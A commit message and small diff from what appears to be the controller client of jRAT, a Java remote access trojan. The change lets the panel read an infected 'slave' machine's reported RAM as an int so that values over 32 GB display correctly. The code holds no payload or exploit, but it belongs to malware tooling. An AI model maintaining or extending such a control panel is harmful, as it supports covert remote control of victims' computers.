Fixed a bug where over Short.MAX_VALUE, like 32 gb, would not show properly

+++ Client/src/pro/jrat/packets/incoming/Packet63InitRAM.java
@@ -11,7 +11,7 @@ public class Packet63InitRAM extends AbstractIncomingPacket {
 
 	@Override
 	public void read(Slave slave, DataInputStream dis) throws Exception {
-		short ram = slave.readShort();
+		int ram = slave.readInt();
 		slave.setRam(ram);
 		
 		int row = Utils.getRow(slave);
